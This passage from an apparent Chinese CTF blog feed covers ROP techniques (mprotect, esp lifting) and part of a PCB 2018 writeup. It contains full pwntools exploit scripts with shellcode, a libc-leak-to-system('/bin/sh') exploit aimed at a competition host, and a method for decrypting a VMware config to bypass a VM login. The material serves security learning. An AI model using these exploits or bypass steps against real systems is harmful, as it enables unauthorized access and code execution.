class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="hljs-string">'./demo1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 'a' * 4 * 12 + ret</span></span><br><span class="line">padding = <span class="hljs-string">'a'</span> * <span class="hljs-number">4</span> * <span class="hljs-number">12</span></span><br><span class="line">shellcode =  <span class="hljs-string">""</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x76\x0e\x8b\xca\xa7\x79\x83\xee\xfc\xe2\xf4\xe1\xc1"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\xff\xe0\xd9\xac\xcf\x54\xe8\x43\x40\x11\xa4\xb9\xcf"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x79\xe3\xe5\xc5\x10\xe5\x43\x44\x2b\x63\xc2\xa7\x79"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x8b\xe5\xc5\x10\xe5\xe5\xd4\x11\x8b\x9d\xf4\xf0\x6a"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x07\x27\x79"</span></span><br><span class="line">pop_eax_ret = <span class="hljs-number">0x0804819c</span></span><br><span class="line">pop_ebx_ret = <span class="hljs-number">0x0804819e</span></span><br><span class="line">pop_ecx_ret = <span class="hljs-number">0x080481a0</span></span><br><span class="line">pop_edx_ret = <span class="hljs-number">0x080481a2</span></span><br><span class="line">int80 = <span class="hljs-number">0x080480f6</span></span><br><span class="line">buf = <span class="hljs-number">0x08048000</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#define PROT_READ0x1     /* Page can be read.  */</span></span><br><span class="line"><span class="hljs-comment">#define PROT_WRITE0x2     /* Page can be written.  */</span></span><br><span class="line"><span class="hljs-comment">#define PROT_EXEC0x4     /* Page can be executed.  */</span></span><br><span class="line"><span class="hljs-comment">#define PROT_NONE0x0     /* Page can not be accessed.  */</span></span><br><span class="line"></span><br><span class="line">payload = padding + p32(pop_eax_ret) + p32(<span class="hljs-number">0x7d</span>)    <span class="hljs-comment"># mprotect</span></span><br><span class="line">payload += p32(pop_ebx_ret) + p32(buf)</span><br><span class="line">payload += p32(pop_ecx_ret) + p32(<span class="hljs-number">0x1000</span>)</span><br><span class="line">payload += p32(pop_edx_ret) + p32(<span class="hljs-number">7</span>)</span><br><span class="line">payload += p32(int80)</span><br><span class="line"></span><br><span class="line">payload +=  p32(pop_eax_ret) + p32(<span class="hljs-number">3</span>)    <span class="hljs-comment"># sys_read</span></span><br><span class="line">payload += p32(pop_ebx_ret) + p32(<span class="hljs-number">0</span>)</span><br><span class="line">payload += p32(pop_ecx_ret) + p32(buf)</span><br><span class="line">payload += p32(pop_edx_ret) + p32(len(shellcode) + <span class="hljs-number">100</span>)</span><br><span class="line">payload += p32(int80)</span><br><span class="line"></span><br><span class="line">payload += p32(buf) <span class="hljs-comment"># implement shellcode</span></span><br><span class="line">log.debug(<span class="hljs-string">"ready to hijick..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.debug(<span class="hljs-string">"ready to inject shellcode..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;mprotect调用前：</p><div align="center"><br>    <img src="/images/posts/pwn/28.png"><br></div><p>&emsp;&emsp;mprotect调用后，权限已经成功改掉：</p><div align="center"><br>    <img src="/images/posts/pwn/29.png"><br></div><h3 id="DEMO2—-esp-lifting"><a href="#DEMO2—-esp-lifting" class="headerlink" title="DEMO2—(esp lifting)"></a>DEMO2—(esp lifting)</h3><p>&emsp;&emsp;这道题是上道题的增强版，背景都一样，但去除了上面可直接利用的<code>pop ret</code>gadget。而生机在代码片段中的<code>sys_write/sys_read</code>的布置中：</p><div align="center"><br>    <img src="/images/posts/pwn/27.png"><br></div><p>&emsp;&emsp;可以看到：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="hljs-number">08048102</span>                 mov     ebx, [esp+fd]   ; fd</span><br><span class="line">.text:<span class="hljs-number">08048106</span>                 mov     ecx, [esp+addr] ; addr</span><br><span class="line">.text:<span class="hljs-number">0804810</span>A                 mov     edx, [esp+len]  ; len</span><br><span class="line">.text:<span class="hljs-number">0804810</span>E                 <span class="hljs-keyword">int</span>     <span class="hljs-number">80</span>h             ; LINUX - sys_read</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这些操作可以帮我们控制各个寄存器，但<code>eax</code>需要另外处理，因为<code>sys_write/sys_read</code>写入或读取的长度会返回在<code>eax</code>中，所以我们可以通过控制它们来控制eax的值，参考上面的system call调用图。</p><p>&emsp;&emsp;但问题是如何进行<code>持久控制</code>，让程序流多跳转几次？</p><p>&emsp;&emsp;在ROPgadget中我找到一条比较有价值的gadget：<code>add esp, 0x20 ; ret</code>。这个gadget可以让我们控制栈高度，虽然没有<code>pop ret</code>直接，但是适合在有参数的函数调用下使用，多出来的部分还可以填充。这种攻击手法称为<code>esp lifting</code>，原理如下：</p><figure class="highlight py hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">eplg:</span><br><span class="line">        addl    $LOCAL_VARS_SIZE,%esp</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">Suppose f1 <span class="hljs-keyword">and</span> f2 are addresses of functions located <span class="hljs-keyword">in</span> a library. We build </span><br><span class="line">the following overflow string (I have skipped buffer fill-up to save space):</span><br><span class="line"></span><br><span class="line">&lt;- stack grows this way</span><br><span class="line">   addresses grow this way -&gt;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">| f1 | eplg | f1_arg1 | f1_arg2 | ... | f1_argn| PAD | f2 | dmm | f2_args...</span><br><span class="line">--------------------------------------------------------------------------- </span><br><span class="line"> ^          ^                                        ^</span><br><span class="line"> |          |                                        |</span><br><span class="line"> |          | &lt;---------LOCAL_VARS_SIZE-------------&gt;|</span><br><span class="line"> |</span><br><span class="line"> |-- this int32 should overwrite <span class="hljs-keyword">return</span> address</span><br><span class="line">                      of a vulnerable function</span><br><span class="line"></span><br><span class="line">  PAD <span class="hljs-keyword">is</span> a padding (consisting of irrelevant nonzero bytes), whose </span><br><span class="line">length, added to the amount of space occupied by f1<span class="hljs-string">'s arguments, should equal</span></span><br><span class="line"><span class="hljs-string">LOCAL_VARS_SIZE.</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;完整payload：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> cuteprint.cuteprint <span class="hljs-keyword">import</span> PrettyPrinter</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>)</span><br><span class="line">pr = PrettyPrinter()</span><br><span class="line">pr.print_title(<span class="hljs-string">"PWN IT"</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="hljs-string">'./demo2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 'a' * 16 + ret</span></span><br><span class="line">padding = <span class="hljs-string">'\xff'</span> * <span class="hljs-number">16</span></span><br><span class="line">shellcode =  <span class="hljs-string">""</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x76\x0e\x8b\xca\xa7\x79\x83\xee\xfc\xe2\xf4\xe1\xc1"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\xff\xe0\xd9\xac\xcf\x54\xe8\x43\x40\x11\xa4\xb9\xcf"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x79\xe3\xe5\xc5\x10\xe5\x43\x44\x2b\x63\xc2\xa7\x79"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x8b\xe5\xc5\x10\xe5\xe5\xd4\x11\x8b\x9d\xf4\xf0\x6a"</span></span><br><span class="line">shellcode += <span class="hljs-string">"\x07\x27\x79"</span></span><br><span class="line"></span><br><span class="line">add_esp_ret = <span class="hljs-number">0x08048198</span></span><br><span class="line">set_ebcdx = <span class="hljs-number">0x0804811A</span>  <span class="hljs-comment"># 这里是 sys_write 函数的部分</span></span><br><span class="line">code_addr = <span class="hljs-number">0x08048000</span></span><br><span class="line">write_msg = <span class="hljs-number">0x08048115</span></span><br><span class="line">read_msg = <span class="hljs-number">0x080480FD</span></span><br><span class="line">mprotect = <span class="hljs-number">0x7d</span></span><br><span class="line"></span><br><span class="line">payload = padding</span><br><span class="line"><span class="hljs-comment"># 设置 eax 为mprotext的调用号 125</span></span><br><span class="line">payload += p32(write_msg) + p32(add_esp_ret) + p32(<span class="hljs-number">1</span>) + p32(code_addr) + p32(mprotect)</span><br><span class="line"><span class="hljs-comment"># 设置 ebx ecx edx，并结合上步调用 mprotect</span></span><br><span class="line">payload += <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0xc</span>) + p32(set_ebcdx) + p32(add_esp_ret) + p32(code_addr) + p32(<span class="hljs-number">0x1000</span>) + p32(<span class="hljs-number">7</span>)</span><br><span class="line"><span class="hljs-comment"># 调用 sys_read 读取shellcode，并执行</span></span><br><span class="line">payload += <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0xc</span>) + p32(read_msg) + p32(code_addr) + p32(<span class="hljs-number">0</span>) + p32(code_addr) + p32(len(shellcode) + <span class="hljs-number">100</span>)</span><br><span class="line"></span><br><span class="line">pr.print_good(<span class="hljs-string">"ready to hijick..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pr.print_good(<span class="hljs-string">"ready to inject shellcode..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">pr.print_good(<span class="hljs-string">"DONE"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://paper.seebug.org/272/" target="_blank" rel="noopener">https://paper.seebug.org/272/</a></li><li><a href="https://introspelliam.github.io/2017/08/06/pwn/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/" target="_blank">系统调用</a></li><li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank">X86-64系统调用号表</a></li><li><a href="http://asm.sourceforge.net/syscall.html#2" target="_blank">X86系统调用号表</a></li><li><a href="http://syscalls.kernelgrok.com/" target="_blank">X86系统调用号表查询</a></li><li><a href="https://blog.csdn.net/Roland_Sun/article/details/33728955" target="_blank">mprotect</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;emsp;&amp;emsp;通过两道ctf题学习&lt;code&gt;ROP&lt;/code&gt;。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwm" scheme="http://yoursite.com/tags/pwm/"/>
    
      <category term="rop" scheme="http://yoursite.com/tags/rop/"/>
    
  </entry>
  
  <entry>
    <title>PCB鹏程杯2018 writeup</title>
    <link href="http://yoursite.com/2018/12/pcb-writeup/"/>
    <id>http://yoursite.com/2018/12/pcb-writeup/</id>
    <published>2018-12-02T14:05:56.000Z</published>
    <updated>2018-12-02T13:57:12.127Z</updated>
    
    <content type="html"><![CDATA[<p>请阅读正文<br><a id="more"></a></p><h2 id="overInt"><a href="#overInt" class="headerlink" title="overInt"></a>overInt</h2><blockquote><p>附带大佬的writeup</p></blockquote><p>先过两关检测，然后有：</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;v8 + v6) = v5;</span><br><span class="line">v3 = (<span class="hljs-keyword">int</span> *)(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v5;</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"str_pos is %c\n"</span>, v3);</span><br></pre></td></tr></table></figure><p>可以<code>一位位</code>的修改栈上任意地址</p><p>大佬说才100，只能写这么多了。完整exp如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack</span><br><span class="line">context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,aslr = <span class="hljs-string">'False'</span>)</span><br><span class="line">local = <span class="hljs-number">1</span></span><br><span class="line">log_level=<span class="hljs-string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> local:</span><br><span class="line">p = process(<span class="hljs-string">"./overInt"</span>)<span class="hljs-comment">#,env=&#123;'LD_PRELOAD':'./libc_x64.so.6'&#125;)</span></span><br><span class="line">elf = ELF(<span class="hljs-string">"./overInt"</span>)</span><br><span class="line"><span class="hljs-comment">#libc = ELF('./libc_x64.so.6')</span></span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">p = remote(<span class="hljs-string">'58.20.46.148'</span>,<span class="hljs-number">35272</span>)</span><br><span class="line">elf = ELF(<span class="hljs-string">"./overInt"</span>)</span><br><span class="line"><span class="hljs-comment">#libc = ELF('./libc_x64.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_addr</span><span class="hljs-params">(num,string)</span>:</span></span><br><span class="line">j = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):</span><br><span class="line">p.recvuntil(<span class="hljs-string">"Which position you want to modify?\n"</span>)</span><br><span class="line">payload = p32(num)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"What content you want to write in?\n"</span>)</span><br><span class="line">payload = string[j]</span><br><span class="line">p.send(payload)</span><br><span class="line">num += <span class="hljs-number">1</span></span><br><span class="line">j += <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="hljs-number">0x0000000000400b13</span></span><br><span class="line">read_got = elf.got[<span class="hljs-string">"read"</span>] <span class="hljs-comment"># 0x602038</span></span><br><span class="line">alarm_got = elf.got[<span class="hljs-string">"alarm"</span>] <span class="hljs-comment"># 0x602030</span></span><br><span class="line">start = <span class="hljs-number">0x4005D0</span></span><br><span class="line">puts_plt = elf.plt[<span class="hljs-string">"puts"</span>] <span class="hljs-comment"># 0x40054c</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)</span><br><span class="line">p.send(<span class="hljs-string">"over"</span>)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">10</span>))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):</span><br><span class="line">data = p.recv()</span><br><span class="line">p.send(p32(<span class="hljs-number">0</span>))</span><br><span class="line">p.recv() </span><br><span class="line">p.send(p32(<span class="hljs-number">0x20633372</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">32</span>))</span><br><span class="line"></span><br><span class="line">string = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#pop_rdi</span></span><br><span class="line">change_addr(<span class="hljs-number">0x38</span>,string)</span><br><span class="line">string = <span class="hljs-string">"\x38\x20\x60\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#read_got</span></span><br><span class="line">change_addr(<span class="hljs-number">0x40</span>,string)</span><br><span class="line">string = <span class="hljs-string">"\x4c\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#puts_plt</span></span><br><span class="line">change_addr(<span class="hljs-number">0x48</span>,string)</span><br><span class="line">string = <span class="hljs-string">"\xd0\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#start</span></span><br><span class="line">change_addr(<span class="hljs-number">0x50</span>,string)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"!"</span>)</span><br><span class="line">data = p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-keyword">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)</span><br><span class="line">data = u64(data)</span><br><span class="line">libc_base = data - <span class="hljs-number">0x0f7250</span></span><br><span class="line">binsh_addr = libc_base + <span class="hljs-number">0x18cd57</span></span><br><span class="line">system_addr = libc_base + <span class="hljs-number">0x045390</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)</span><br><span class="line">p.send(<span class="hljs-string">"over"</span>)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">10</span>))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):</span><br><span class="line">data = p.recv()</span><br><span class="line">p.send(p32(<span class="hljs-number">0</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(<span class="hljs-number">0x20633372</span>))</span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">24</span>))</span><br><span class="line">string = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#pop_rdi</span></span><br><span class="line">change_addr(<span class="hljs-number">0x38</span>,string)</span><br><span class="line">string = pack(<span class="hljs-string">'L'</span>,binsh_addr)</span><br><span class="line">change_addr(<span class="hljs-number">0x40</span>,string)</span><br><span class="line">string = pack(<span class="hljs-string">'L'</span>,system_addr)</span><br><span class="line">change_addr(<span class="hljs-number">0x48</span>,string)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="hack1t"><a href="#hack1t" class="headerlink" title="hack1t"></a>hack1t</h2><p>打开虚拟机发现需要密码，把题目描述中的<code>bibinb</code>输入进行就行。</p><div align="center"><br>    <img src="/images/posts/pcb/1.png"><br></div><p>打开虚拟机后发现需要用户账号密码才进得去，随便试了一下都以失败告终，所以考点就是绕过用户验证，按常规套路来说在系统启动是强行进入<code>GRUB</code>，然后改密码，但发现进<code>GRUB</code>也需要密码：</p><div align="center"><br>    <img src="/images/posts/pcb/2.png"><br></div><p>所以这条路也行不通，那么另一个思路就是在加载系统时加载一个<code>ISO</code>，然后进入系统，再ISO镜像中对原来的硬盘进行操作。但发现修改虚拟机配置需要密码，而这个密码跟上面的不一样。</p><div align="center"><br>    <img src="/images/posts/pcb/3.png"><br></div><p>所以这条路暂时也没辙了。回过头查看下虚拟机的配置文件如<code>vmx、nvram</code>等，发现都已经被加密，正常的配置文件是键值对存储，而加密后的则如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.encoding = &quot;UTF-8&quot;</span><br><span class="line">displayName = &quot;Ubuntu 64-bit&quot;</span><br><span class="line">policy.vm.sourcevmid = &quot;52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29&quot;</span><br><span class="line">encryption.keySafe = &quot;vmware:key/list/(pair/(phrase/a%2bFUjt......))&quot;</span><br><span class="line">encryption.data = &quot;A8Y2HMBeynR9AnL.....&quot;</span><br></pre></td></tr></table></figure><p>因为虚拟机的配置是通过文件来实现的，所以如果我们能直接修改配置文件也能达到我们想要的结果，经过一番搜索后找到了一些有用的资料，在VMware的社区上发现了一个issue，有个大神实现了对vmx加密算法的破解和运用，并且发布到了GitHub中。</p><ul><li><a href="https://communities.vmware.com/thread/582158" target="_blank">issue链接</a></li><li><a href="https://github.com/RF3/VMwareVMX" target="_blank">GitHub项目</a></li></ul><p>当然使用这个工具解密是会<code>Will ask for the password</code>，但我们还是可以再碰一下bibinb这个密码。</p><p>其实这个工具很早就下下来了，但当时不会用，其实是它的脚本写的有瑕疵，坑爹了，给我报了个error：</p><div align="center"><br>    <img src="/images/posts/pcb/4.png"><br></div><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Cannot read from file Ubuntu 64-bit.vmx.bak</span><br></pre></td></tr></table></figure><p>但拿去操作正常的vmx文件又是可以的，当时也没怎么多想，就把工具放在了一边，继续找资料，但后来就觉得这个错误或许可以跟一下，而正是这个决定让我拿下这题。打开<code>main.py</code>，很容易就发现了问题所在，程序进来后会判断：</p><figure class="highlight py hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:</span><br><span class="line">    <span class="hljs-keyword">if</span> displayname <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:</span><br><span class="line">        match = re.match(<span class="hljs-string">'displayName *= *"(.+)"\n'</span>, line)</span><br><span class="line">        <span class="hljs-keyword">if</span> match:</span><br><span class="line">            displayname = match.group(<span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">'encryption.keySafe'</span> <span class="hljs-keyword">in</span> line:</span><br><span class="line">        keysafe = line</span><br><span class="line">    <span class="hljs-keyword">elif</span> <span class="hljs-string">'encryption.data'</span> <span class="hljs-keyword">in</span> line:</span><br><span class="line">        data = line</span><br></pre></td></tr></table></figure><p>而在观察中发现它给的<code>displayname</code>是小写，而判断是大写，直接改一下试试：</p><div align="center"><br>    <img src="/images/posts/pcb/5.png"><br></div><p>改好后直接跑，发现成功解密出配置：</p><div align="center"><br>    <img src="/images/posts/pcb/6.png"><br></div><p>那么接下来就好办了，先在其他虚拟机上配置一个<code>CDROM</code>，看一下它的vmx配置文件怎么写，然后我们照抄过来，然后在加密回去就行，下面是配置cdrom：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sata0:1.deviceType = &quot;cdrom-image&quot;</span><br><span class="line">sata0:1.fileName = &quot;E:\kali-linux-2018.1-i386.iso&quot;</span><br><span class="line">sata0:1.present = &quot;TRUE&quot;</span><br><span class="line">usb.present = &quot;TRUE&quot;    # USB开启</span><br></pre></td></tr></table></figure><p>然后在把解密出来的文件中的中文随便改成什么英文，防止python的编码错误。</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py -e -D <span class="hljs-string">"Ubuntu 64-bit"</span> -p bibinb reconver.vmx myencry.vmx</span><br></pre></td></tr></table></figure><p>改好后替换掉原来的文件，然后在虚拟机配置中就能看到cdrom和USB已被开启。</p><div align="center"><br>    <img src="/images/posts/pcb/7.png"><br></div><p>紧接着在虚拟机启动时按<code>ESC</code>选择从<code>CD-ROM</code>中启动，这样就能进去系统，从而操作文件系统。</p><p>将四个部分的rar压缩包放在同一个文件夹，然后解压：</p><div align="center"><br>    <img src="/images/posts/pcb/8.png"><br></div><p>拿到flag。</p><h2 id="Traffic-Light"><a href="#Traffic-Light" class="headerlink" title="Traffic_Light"></a>Traffic_Light</h2><p>这是一个交通灯的<code>gif</code>，用<code>file</code>、<code>binwalk</code>检查后都很正常，猜测可能是灯的闪烁代表0,1。网上找了个分离每帧git的python脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td 